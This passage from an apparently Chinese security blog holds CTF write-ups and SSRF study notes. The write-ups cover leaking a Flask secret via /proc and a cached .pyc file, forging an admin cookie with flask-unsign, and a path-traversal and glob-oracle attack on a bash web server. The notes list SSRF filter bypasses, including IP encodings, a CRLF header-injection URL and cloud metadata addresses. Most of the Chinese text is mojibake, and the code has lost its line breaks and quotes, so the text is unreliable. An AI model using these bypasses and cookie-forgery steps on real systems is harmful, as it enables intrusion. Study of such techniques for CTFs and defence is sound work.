/procæ¥è¿›è¡Œè¯»å–ç›¸å…³å†…å®¹ï¼Œ/procæ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„æ–‡ä»¶ç³»ç»Ÿï¼Œå…³äºå®ƒçš„ä¸€äº›åŸºç¡€ç”¨æ³•å¯ä»¥è®¿é—®è¯¥ç½‘å€ï¼šhttps://blog.csdn.net/cosmoslin/article/details/122660083 æˆ‘ä»¬å¼€å§‹ä½¿ç”¨ å¯ä»¥çœ‹åˆ°å“åº”çš„å†…å®¹é‡Œé¢æœ‰ä¸ªuwsgiï¼Œé€šè¿‡æœç´¢å¯çŸ¥è¿™è·Ÿpythonèµ·ä¸ªæœåŠ¡æœ‰å…³ï¼Œè¯´æ˜è¯¥é¢˜çš„åç«¯è¯­è¨€æ˜¯pythonï¼Œå†…å®¹çš„ååŠéƒ¨åˆ†æ˜¯æ‰€å±çš„é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®ï¼ˆç”±äºåšçš„é¢˜ç›®éƒ½æ˜¯dockeré‡Œé¢èµ·çš„æœåŠ¡ï¼Œæ‰€ä»¥è¿›ç¨‹å·éƒ½æ˜¯1ï¼Œselfå¯ä»¥æ”¹ä¸º1ï¼‰ ç„¶åæˆ‘ä»¬å¯ä»¥è¿›è¡Œé¡ºè—¤æ‘¸ç“œè®¿é—®å…¶åç«¯æ–‡ä»¶ æˆ‘ä»¬æ•´ç†ä¸€ä¸‹ï¼Œå˜å›flaskçš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š from flask import Flask, request, send_from_directory, session, abortfrom requestlib import fetchfrom config import session_encryption_keyimport subprocessimport osdef protect_secrets(): os.unlink(config.py)def check_url(url): if not isinstance(url, str) or len(url) == 0: return False, Please provide a regular url! if not url.startswith(https://) or url.lstrip() != url: return False, Url must start with https://. We do not want anything insecure here! return True, app = Flask(__name__, static_folder=static, static_url_path=/assets/)app.secret_key = session_encryption_keyprint(Using key:, app.secret_key)protect_secrets()@app.route(/, methods=[GET])def home(): return send_from_directory(pages, index.html)@app.route(/flag, methods=[GET])def healthcheck(): if session.get(admin) == True: return subprocess.check_output(/readflag) else: return abort(403)@app.route(/check, methods=[POST])def check(): url = request.form.get(url) valid, err = check_url(url) if not valid: return success: False, error: err if True: content = fetch(url) return success: True, online: content != None, content: content if __name__ == __main__: app.run(host=0.0.0.0, port=10600, debug=False) å…¶ä¸­æœ€å¼•äººç©ç›®çš„ä¾¿æ˜¯ä¸‹é¢è¿™å—å­è·¯ç”±ä¸º /flagçš„ä»£ç  @app.route(/flag, methods=[GET])def healthcheck(): if session.get(admin) == True: return subprocess.check_output(/readflag) else: return abort(403) éœ€è¦ /flag è®¿é—® admin è®¾ç½® True ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦æ³„æ¼ session_encryption_key å€¼ï¼Œä½†æ˜¯ä»”ç»†çœ‹ä»£ç ä¼šå‘ç°ä»£ç åœ¨è¿™ä¹‹å‰ä¼šæ‰§è¡Œä¸€ä¸ªå‡½æ•°å°† config.pyæ–‡ä»¶åˆ é™¤æ‰ï¼Œå¯¼è‡´æˆ‘ä»¬çš„æ–¹æ³•ä¸ä¼šæˆåŠŸï¼Œé¢˜è§£ä¸­å‘Šè¯‰æˆ‘ä»¬åœ¨Pythonå·¥ä½œç›®å½•ä¸‹ï¼Œå¦‚æœæ‰§è¡ŒæŸæ–‡ä»¶åç»å¸¸ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª__pycache__æ–‡ä»¶å¤¹ï¼Œå°±æ˜¯pythonçš„ç¼“å­˜æ–‡ä»¶å¤¹ ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœæ‰§è¡Œçš„æ˜¯python ./demo.pyï¼Œå°±ä¼šç”Ÿæˆdemo.cpython-39.pycæ–‡ä»¶ï¼Œåé¢çš„39æ˜¯pythonç‰ˆæœ¬å·å¹¶å»æ‰äº†å°æ•°ç‚¹ï¼Œè¯¥é¢˜çš„python ç‰ˆæœ¬å·æ˜¯3.11ï¼ˆå¯ä»¥é€šè¿‡å‰é¢æŠ“åŒ…è®¿é—®çš„é…ç½®æ–‡ä»¶å›æ˜¾çš„å†…å®¹å‘ç°ï¼‰ï¼Œé¢˜è§£å‘Šè¯‰äº†æˆ‘ä»¬è¿™ç§æ–‡ä»¶å­˜å‚¨çš„è·¯å¾„æ˜¯ /var/www/keep-dreaming-sonny-boy/__pycache__/config.cpython-311.pycï¼Œæ‰€ä»¥æˆ‘ä»¬å¼€å§‹å°è¯• å›æ˜¾äº†ä¸€å¤§ä¸²16è¿›åˆ¶çš„æ•°æ®ï¼Œæˆ‘ä»¬å°†å®ƒè½¬åŒ–ä¸º2è¿›åˆ¶çš„æ•°æ®ï¼Œè¿™æ˜¯é€†å‘å·¥ç¨‹ï¼Œä»¥ä¸‹è„šæœ¬å¯ä»¥å¸®åŠ©åˆ°ä½  data_str =\\\\xa7\\\\r\\\\r\\ \\\\x00\\\\x00\\\\x00\\\\x00\\\\x86\\\\x84\\\\xf7e;\\\\x00\\\\x00\\\\x00\\\\xe3\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xf3\\ \\\\x00\\\\x00\\\\x00\\\\x97\\\\x00d\\\\x00Z\\\\x00d\\\\x01S\\\\x00)\\\\x02\\\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\\\x01\\\\xda\\\\x16session_encryption_key\\\\xa9\\\\x00\\\\xf3\\\\x00\\\\x00\\\\x00\\\\x00\\\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\\\xfa\\\\x08moduler\\\\x07\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00s\\\\x11\\\\x00\\\\x00\\\\x00\\\\xf0\\\\x03\\\\x01\\\\x01\\\\x01\\\\xd8\\\\x19;\\\\xd0\\\\x00\\\\x16\\\\xd0\\\\x00\\\\x16\\\\xd0\\\\x00\\\\x16r\\\\x05\\\\x00\\\\x00\\\\x00#å°†å­—ç¬¦ä¸²é‡Œé¢çš„è½¬ä¹‰åºåˆ—è½¬åŒ–ä¸ºç›¸åº”çš„äºŒè¿›åˆ¶æ•°æ®binary_data = bytes(data_str, utf-8).decode(unicode_escape).encode(latin1)#ä¿å­˜åˆ°æ–‡ä»¶ä¸­with open(output_binary_data.txt, wb) as file: file.write(binary_data)print(Success) å°†æ–‡ä»¶åç¼€åå‘½åä¸º .pycï¼Œç„¶åä¸Šç½‘æ‰¾ä¸ªåœ¨çº¿pycæ–‡ä»¶åç¼–è¯‘çš„ç½‘ç«™ç”¨ä¸€ä¸‹ï¼Œå¾—åˆ°ä»¥ä¸‹ç»“æœï¼š # Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.11session_encryption_key = Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL ç„¶åä½¿ç”¨å·¥å…·ä¼ªé€ ä¸€ä¸ªå±äºæˆ‘ä»¬è‡ªå·±çš„cookieï¼Œè¿™è¾¹ç”¨çš„æ˜¯ Flask Unsignï¼Œå¯ä»¥åœ¨githubä¸Šé¢å®‰è£…ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š $ pip3 install flask-unsign[wordlist] ä¼ªé€ cookieï¼š flask-unsign --sign --cookie admin: True --secret Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL å°†å¾—åˆ°çš„sessionå¤åˆ¶åˆ°cookieå¤„ï¼Œç„¶åè®¿é—® /flagï¼Œå¾—åˆ°flag BadAss Server for Hypertextå…ˆç”¨bpæŠ“ä¸ªåŒ…ï¼Œå°è¯•ä¸€ä¸‹ç›®å½•ç©¿è¶Šï¼Œå‘ç°æˆåŠŸäº† åˆ©ç”¨ /procæ¥è¿›è¡Œå°è¯•ï¼ŒæŸ¥çœ‹cmdlineç›®å½•è·å–å¯åŠ¨æŒ‡å®šè¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ è®¿é—® /../../../../../../app/badass_server.shï¼Œè·å¾—å¦‚ä¸‹ä»£ç ï¼š #!/bin/bash# I hope there are no bugs in this source code...set -edeclare -A request_headersdeclare -A response_headersdeclare methoddeclare urideclare protocoldeclare request_bodydeclare status=200 OKabort() declare -gA response_headers\tstatus=400 Bad Request\twrite_headers\tif [ ! -z $1+x ]; then 2 echo Request aborted: $1 echo -en $1\tfi\texit 1write_headers() response_headers[Connection]=close\tresponse_headers[X-Powered-By]=Bash\techo -en HTTP/1.0 $status\\r for key in $!response_headers[@]; do echo -en $key: $response_headers[$key]\\r done\techo -en \\r 2 echo $(date -u +%Y-%m-%dT%H:%M:%SZ) $SOCAT_PEERADDR $method $uri $protocol - $statusreceive_request() read -d $ -a request_line\tif [ $#request_line[@] != 3 ]; then abort Invalid request line\tfi\tmethod=$request_line[0]\turi=$request_line[1]\tprotocol=$(echo -n $request_line[2] | sed s/^\\s*//g | sed s/\\s*$//g)\tif [[ ! $method =~ ^(GET|HEAD)$ ]]; then abort Invalid request method\tfi\tif [[ ! $uri =~ ^/ ]]; then abort Invalid URI\tfi\tif [ $protocol != HTTP/1.0 ] [ $protocol != HTTP/1.1 ]; then abort Invalid protocol\tfi\twhile read -d $ header; do stripped_header=$(echo -n $header | sed s/^\\s*//g | sed s/\\s*$//g) if [ -z $stripped_header ]; then break; fi header_name=$(echo -n $header | cut -d : -f 1 | sed s/^\\s*//g | sed s/\\s*$//g | tr [:upper:] [:lower:]); header_value=$(echo -n $header | cut -d : -f 2- | sed s/^\\s*//g | sed s/\\s*$//g); if [ -z $header_name ] || [[ $header_name =~ [[:space:]] ]]; then abort Invalid header name; fi # If header already exists, add value to comma separated list if [[ -v request_headers[$header_name] ]]; then request_headers[$header_name]=$request_headers[$header_name], $header_value else request_headers[$header_name]=$header_value fi\tdone\tbody_length=$request_headers[content-length]:-0\tif [[ ! $body_length =~ ^[0-9]+$ ]]; then abort Invalid Content-Length\tfi\tread -N $body_length request_bodyhandle_request() # Default: serve from static directory\tpath=/app/static$uri\tpath_last_character=$(echo -n $path | tail -c 1)\tif [ $path_last_character == / ]; then path=$pathindex.html\tfi\tif ! cat $path /dev/null; then status=404 Not Found\telse mime_type=$(file --mime-type -b $path) file_size=$(stat --printf=%s $path) response_headers[Content-Type]=$mime_type response_headers[Content-Length]=$file_size\tfi\twrite_headers\tcat $path 21receive_requesthandle_request æˆ‘æ³¨æ„åˆ°ä»¥ä¸‹é€»è¾‘ï¼š if [ $protocol != HTTP/1.0 ] [ $protocol != HTTP/1.1 ]; then abort Invalid protocol fi This has some unquoted variables and may allow us to glob the $protocol value. I tried a basic test:è¿™æœ‰ä¸€äº›æœªåŠ å¼•å·çš„å˜é‡ï¼Œå¯èƒ½å…è®¸æˆ‘ä»¬å¯¹ $protocol å€¼è¿›è¡Œå…¨çƒåŒ–ã€‚æˆ‘å°è¯•äº†ä¸€ä¸ªåŸºæœ¬æµ‹è¯•ï¼š é€šé…å®ƒåº”è¯¥åªäº§ç”Ÿä¸€ä¸ªç»“æœï¼Œæˆ‘ä»¬å¾—åˆ°äº† Invalid Protocol ï¼Œæ‰€ä»¥æˆ‘æ¥ä¸‹æ¥å°è¯•ï¼š è¿™åº”è¯¥äº§ç”Ÿ 1 ä¸ªç»“æœï¼ˆå¦‚æœå‰é¢çš„æ–‡ä»¶æ˜¯ä¸å­˜åœ¨çš„è¯ï¼Œè¿™æ¬¡æœåŠ¡å™¨çš„è¾“å‡ºæ˜¯é”™è¯¯çš„ catï¼‰ã€‚æµ‹è¯•ä¸€ä¸ªåº”è¯¥äº§ç”Ÿ 0 ç»“æœçš„ä¹Ÿä¼šç»™å‡º Invalid Protocol äº†ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬æœ‰ä¸€ä¸ªé¢„è¨€æœºï¼Œæˆ‘ä»¬å¯ä»¥æ£€æµ‹ç›®å½•ä¸­æ˜¯å¦æœ‰ 1 ä¸ªæ–‡ä»¶ã€‚æˆ‘ä»¬æƒ³æ³„éœ²åŒ…å«è¯¥æ ‡å¿—çš„éšè—ç›®å½•ï¼ˆå¤§æ¦‚ï¼‰ã€‚æˆ‘å†³å®šæœ€å¥½ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ–¹æ³•ã€‚æˆ‘ä»¬å¿…é¡»åˆ›å»ºä¸€ä¸ªä¸å·²çŸ¥æ–‡ä»¶å¤¹ä¹‹ä¸€ï¼ˆé€šè¿‡æŸ¥çœ‹é¡µé¢æºç å¯ä»¥ç¡®å®šä¸€ä¸ªå·²çŸ¥æ–‡ä»¶åï¼‰å®Œå…¨åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥æš´åŠ›ç ´è§£å€¼ä»¥æ‰¾åˆ°éšè—çš„æ–‡ä»¶å¤¹ï¼ˆè¿™æ · glob å°†è¿”å› 2 ä¸ªæ–‡ä»¶å¹¶ç»™æˆ‘ä»¬é‚£ä¸ª cat é”™è¯¯æˆ–å…¶ä»–çš„)ï¼å·¥ä½œåŸç†å¦‚ä¸‹ï¼š /assets/f200d055a267ae56160198e0fcb47e5f/try_harder.tx /app/static/assets/[^fabcde1345678][^123457890abc][^abe][^abcdef124][^abcde1][^abcdef0134][^abdef012347][^012345678abcde][^103456789abcd][^abcdef013][^abcde01234567][^a-f0123456][^a-f0234][^b-f012345678][^ab][^678][^a][^a-f0][^134567890abcdef][^b-f01][^abdef1234567890][^a][^abcdef12340678][^b-f1][^01234568][^a-f01234][^abdef0123][^1234567890abcef][^a][^ac][^a-f02345][^a-f02345]* æœ€åæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°éšè—çš„ç›®å½• 9df5256fe48859c91122cb92964dbd66 ï¼Œå¹¶ä¸”å¯ä»¥æ‰¾åˆ°ä½äº /assets/9df5256fe48859c91122cb92964dbd66/flag.txtä¸­çš„flag","categories":["Write-Up"]},{"title":"ssrfå­¦ä¹ ","path":"/2024/03/19/ssrfå­¦ä¹ /","content":"SSRFï¼ˆServer Side Request ForgeryæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰ï¼Œæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ ä½†æ˜¯ç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚SSRFçš„æ”»å‡»ç›®æ ‡ä¸€èˆ¬æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨æœåŠ¡å™¨ã€‚ SSRFæ¼æ´çš„åŸç† SSRFæ¼æ´åŸç† ï¼ˆ1ï¼‰æ”»å‡»è€…å¯ä»¥é€šè¿‡å…¬ç½‘è®¿é—®åˆ°æŸä¸ªwebæœåŠ¡å™¨ï¼› ï¼ˆ2ï¼‰ä½†æ˜¯æ”»å‡»è€…æ˜¯æ— æ³•é€šè¿‡å…¬ç½‘è®¿é—®åˆ°å†…ç½‘çš„å…¶ä»–è®¾å¤‡æˆ–è€…åŠå…¬åŒºåŸŸï¼› ï¼ˆ3ï¼‰è¿™æ—¶å€™å¦‚æœæƒ³è¿›è¡Œå†…ç½‘æ¢æµ‹ï¼ŒwebæœåŠ¡å™¨åŒæ—¶å­˜åœ¨SSRFæ¼æ´ï¼Œå°±èƒ½ä»¥webæœåŠ¡å™¨ä½œä¸ºè·³æ¿ï¼Œè¿›è€Œæ”»å‡»å…¶ä»–æœåŠ¡å™¨æˆ–åŒºåŸŸ SSRFåˆ©ç”¨çš„æ¡ä»¶ï¼š ï¼ˆ1ï¼‰webæœåŠ¡å™¨å­˜åœ¨SSRFæ¼æ´ï¼› ï¼ˆ2ï¼‰webæœåŠ¡å™¨æœ‰è®¿é—®æœ¬åœ°æˆ–è¿œç¨‹æœåŠ¡å™¨çš„æƒé™ï¼› SSRFå­˜åœ¨çš„ä½ç½®ï¼šä¸€èˆ¬æ˜¯webæœåŠ¡å™¨æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨è·å–æ•°æ®çš„åŠŸèƒ½ã€‚ ï¼ˆ1ï¼‰ åˆ†äº«åŠŸèƒ½ï¼šé€šè¿‡URLåœ°å€åˆ†äº«æ–‡ç« ç­‰ï¼Œä¾‹å¦‚å¦‚ä¸‹åœ°å€ï¼š http://share.xxx.com/index.php?url=http://www.xxx.com é€šè¿‡urlå‚æ•°çš„è·å–æ¥å®ç°ç‚¹å‡»é“¾æ¥çš„æ—¶å€™è·³åˆ°æŒ‡å®šçš„åˆ†äº«æ–‡ç« ã€‚å¦‚æœåœ¨æ­¤åŠŸèƒ½ä¸­æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€çš„èŒƒå›´åšè¿‡æ»¤ä¸é™åˆ¶åˆ™å°±å­˜åœ¨ç€SSRFæ¼æ´ã€‚ ï¼ˆ2ï¼‰å›¾ç‰‡åŠ è½½ä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡ï¼š http://image.xxx.com/image.php?image=http://www.xxx.com å›¾ç‰‡åŠ è½½å­˜åœ¨äºå¾ˆå¤šçš„ç¼–è¾‘å™¨ä¸­ï¼Œç¼–è¾‘å™¨ä¸Šä¼ å›¾ç‰‡å¤„åŠ è½½è®¾å®šå¥½çš„è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å›¾ç‰‡åœ°å€ï¼Œå¦‚æœæ²¡å¯¹åŠ è½½çš„å‚æ•°åšé™åˆ¶å¯èƒ½é€ æˆSSRFã€‚ ï¼ˆ3ï¼‰å›¾ç‰‡æ–‡ç« æ”¶è—åŠŸèƒ½ï¼š http://title.xxx.com/title?title=http://title.xxx.com/xxx ä¾‹å¦‚ titleå‚æ•°æ˜¯æ–‡ç« çš„æ ‡é¢˜åœ°å€ï¼Œä»£è¡¨äº†ä¸€ä¸ªæ–‡ç« çš„åœ°å€é“¾æ¥ï¼Œå¦‚æœæ”¶è—åŠŸèƒ½é‡‡ç”¨äº†æ­¤ç§å½¢å¼ä¿å­˜æ–‡ç« ï¼Œåˆ™åœ¨æ²¡æœ‰é™åˆ¶å‚æ•°çš„å½¢å¼ä¸‹å¯èƒ½å­˜åœ¨SSRFã€‚ ï¼ˆ4ï¼‰è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆã€‚ ï¼ˆ5ï¼‰åœ¨çº¿ç¿»è¯‘ï¼šç»™ç½‘å€ç¿»è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹ã€‚ ï¼ˆ6ï¼‰é‚®ä»¶ç³»ç»Ÿï¼šæ¯”å¦‚æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€ã€‚ ï¼ˆ7ï¼‰åˆ©ç”¨å‚æ•°ä¸­çš„å…³é”®å­—æŸ¥æ‰¾ï¼š å…³é”®å­—ï¼š shareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domain... æ€»çš„æ¥è¯´ï¼Œéœ€è¦ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºçš„ç½‘ç«™éƒ½æœ‰å¯èƒ½å­˜åœ¨SSRFæ¼æ´ SSRFçš„æŒ–æ˜ï¼Œçœ‹URLæ˜¯å¦æœ‰å…³é”®å­—â€œXX=â€ Shareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€ sourceURLã€imageURLã€domain 5.æ¼æ´éªŒè¯: å› ä¸ºSSRFæ¼æ´æ˜¯æ„é€ æœåŠ¡å™¨å‘é€è¯·æ±‚çš„å®‰å…¨æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯å¦æ˜¯ç”±æœåŠ¡å™¨ç«¯å‘é€çš„æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨SSRFæ¼æ´ã€‚ åœ¨é¡µé¢æºç ä¸­æŸ¥æ‰¾è®¿é—®çš„èµ„æºåœ°å€ï¼Œå¦‚æœè¯¥èµ„æºåœ°å€ç±»å‹ä¸ºhttp://www.xxx.com/a.php?image=åœ°å€å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´ã€‚ å›ç¯åœ°å€127.0.0.08 ç½‘ç»œèŒƒå›´: 127.0.0.1 æ˜¯ç¯å›åœ°å€ï¼ˆloopback addressï¼‰ï¼Œç”¨äºæœ¬åœ°æœºå™¨çš„ç½‘ç»œæµ‹è¯•å’Œé€šä¿¡ã€‚å®é™…ä¸Šï¼Œæ•´ä¸ª 127.0.0.08 çš„ IP èŒƒå›´ï¼ˆå³ä» 127.0.0.0 åˆ° 127.255.255.255ï¼‰éƒ½è¢«ä¿ç•™ç”¨äºç¯å›åŠŸèƒ½ã€‚è¿™æ„å‘³ç€ï¼Œæ‰€æœ‰ 127.x.x.x çš„åœ°å€éƒ½æŒ‡å‘æœ¬åœ°æœºå™¨ã€‚ é»˜è®¤ç½‘å…³çš„ç®€åŒ–: åœ¨ IP åœ°å€è¡¨ç¤ºä¸­ï¼Œçœç•¥æœ«å°¾çš„é›¶å¹¶ä¿ç•™æœ€åçš„éƒ¨åˆ†æ˜¯ä¸€ç§ç®€åŒ–å½¢å¼ã€‚ä¾‹å¦‚ï¼Œ127.1 å®é™…ä¸Šæ˜¯ 127.0.0.1 çš„ç®€å†™ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è¡¥å…¨ç¼ºå¤±çš„éƒ¨åˆ†ã€‚å› æ­¤ï¼Œ127.1 ç­‰åŒäº 127.0.0.1ã€‚ å†…éƒ¨è·¯ç”±æœºåˆ¶: å½“ç³»ç»Ÿå¤„ç† 127.x.x.x åœ°å€æ—¶ï¼Œå®ƒçŸ¥é“è¿™äº›åœ°å€æ˜¯ä¿ç•™ç»™æœ¬åœ°å›ç¯ä½¿ç”¨çš„ï¼Œè€Œä¸éœ€è¦é€šè¿‡ä»»ä½•å¤–éƒ¨ç½‘ç»œè·¯ç”±ã€‚å› æ­¤ï¼Œ127.1 å’Œ 127.0.0.1 éƒ½ä¼šè¢«è¯†åˆ«ä¸ºæŒ‡å‘æœ¬åœ°æœºå™¨çš„åœ°å€ã€‚ ç»•è¿‡æ–¹æ³•éƒ¨åˆ†å­˜åœ¨æ¼æ´ï¼Œæˆ–è€…å¯èƒ½äº§ç”ŸSSRFçš„åŠŸèƒ½ä¸­åšäº†ç™½åå•æˆ–è€…é»‘åå•çš„å¤„ç†ï¼Œæ¥è¾¾åˆ°é˜»æ­¢å¯¹å†…ç½‘æœåŠ¡å’Œèµ„æºçš„æ”»å‡»å’Œè®¿é—®ã€‚å› æ­¤æƒ³è¦è¾¾åˆ°SSRFçš„æ”»å‡»ï¼Œéœ€è¦å¯¹è¯·æ±‚çš„å‚æ•°åœ°å€åšç›¸å…³çš„ç»•è¿‡å¤„ç†ï¼Œå¸¸è§çš„ç»•è¿‡æ–¹å¼å¦‚ä¸‹ï¼š 1ã€ç»•è¿‡é™åˆ¶ä¸ºæŸç§åŸŸåï¼šï¼ˆ1ï¼‰åˆ©ç”¨@ï¼Œå½“ç½‘ç«™é™åˆ¶åªèƒ½è®¿é—® http://www.xxx.comç±»å‹çš„åŸŸåæ—¶ï¼Œå¯ä»¥é‡‡ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ï¼Œå¦‚ï¼šhttp://www.xxx.com@www.xxc.com åœ¨å¯¹@è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚ï¼Œä¾‹å¦‚ï¼š http://www.aaa.com@www.bbb.com@www.ccc.com åœ¨PHPçš„parse_urlä¸­ä¼šè¯†åˆ« www.ccc.comï¼Œè€Œlibcurlåˆ™è¯†åˆ«ä¸º www.bbb.comã€‚ 2ã€ç»•è¿‡é™åˆ¶è¯·æ±‚IPä¸ä¸ºå†…ç½‘åœ°å€ï¼šï¼ˆ1ï¼‰é‡‡ç”¨çŸ­ç½‘å€ç»•è¿‡ï¼šæ¯”å¦‚ç™¾åº¦çŸ­åœ°å€https://dwz.cn/ ï¼ˆ2ï¼‰åˆ©ç”¨ç‰¹æ®ŠåŸŸåï¼Œxip.ioå¯ä»¥æŒ‡å‘ä»»æ„åŸŸåï¼ˆåŸç†æ˜¯DNSè§£æï¼‰ï¼Œå³ 127.0.0.1.xip.ioï¼Œå¯ä»¥è§£æä¸º127.0.0.1 ï¼ˆ3ï¼‰é‡‡ç”¨è¿›åˆ¶è½¬æ¢ï¼Œ127.0.0.1 å…«è¿›åˆ¶ï¼š0177.0.0.1ï¼›åå…­è¿›åˆ¶ï¼š0x7f.0.0.1ï¼›åè¿›åˆ¶ï¼š2130706433 ï¼ˆ4ï¼‰åˆ©ç”¨[::]ï¼Œå¯ä»¥åˆ©ç”¨[::]æ¥ç»•è¿‡localhostï¼Œæ¯”å¦‚ï¼šhttp://[::]:80/ ä¼šè§£æä¸º http://127.0.0.1 ï¼ˆ5ï¼‰æ·»åŠ ç«¯å£å·ï¼Œhttp://127.0.0.1:8080 ï¼ˆ6ï¼‰åˆ©ç”¨å¥å·ï¼Œ127ã€‚0ã€‚0ã€‚1 ä¼šè§£æä¸º 127.0.0.1 ï¼ˆ7ï¼‰é‡‡ç”¨è·³è½¬ï¼šå¸¸ç”¨çš„è·³è½¬æœ‰302è·³è½¬å’Œ307è·³è½¬ï¼ŒåŒºåˆ«åœ¨äº307è·³è½¬ä¼šè½¬å‘POSTè¯·æ±‚ä¸­çš„æ•°æ®ç­‰ï¼Œä½†æ˜¯302è·³è½¬ä¸ä¼š ï¼ˆ8ï¼‰CRLF ç¼–ç ç»•è¿‡ %0d-0x0d-\\rå›è½¦%0a-0x0a- æ¢è¡Œè¿›è¡ŒHTTPå¤´éƒ¨æ³¨å…¥ example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a ï¼ˆ9ï¼‰åˆ©ç”¨å°é—­çš„å­—æ¯æ•°å­— åˆ©ç”¨Enclosed alphanumericsâ“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ example.comhttp://169.254.169.254http://[::â‘ â‘¥â‘¨ï½¡â‘¡â‘¤â‘£ï½¡â‘¯â‘¨ï½¡â‘¡â‘¤â‘£]List:â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’›â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µâ’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“©â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿ 3ã€é™åˆ¶è¯·æ±‚åªä¸ºhttpåè®®ï¼šï¼ˆ1ï¼‰é‡‡ç”¨è·³è½¬ï¼šå¸¸ç”¨çš„è·³è½¬æœ‰302è·³è½¬å’Œ307è·³è½¬ï¼ŒåŒºåˆ«åœ¨äº307è·³è½¬ä¼šè½¬å‘POSTè¯·æ±‚ä¸­çš„æ•°æ®ç­‰ï¼Œä½†æ˜¯302è·³è½¬ä¸ä¼š ï¼ˆ2ï¼‰é‡‡ç”¨çŸ­åœ°å€ DNS Rebindingä¸€ä¸ªå¸¸ç”¨çš„é˜²æŠ¤æ€è·¯æ˜¯ï¼šå¯¹äºç”¨æˆ·è¯·æ±‚çš„URLå‚æ•°ï¼Œé¦–å…ˆæœåŠ¡å™¨ç«¯ä¼šå¯¹å…¶è¿›è¡ŒDNSè§£æï¼Œç„¶åå¯¹äºDNSæœåŠ¡å™¨è¿”å›çš„IPåœ°å€è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœåœ¨é»‘åå•ä¸­ï¼Œå°±ç¦æ­¢è¯¥æ¬¡è¯·æ±‚ã€‚ 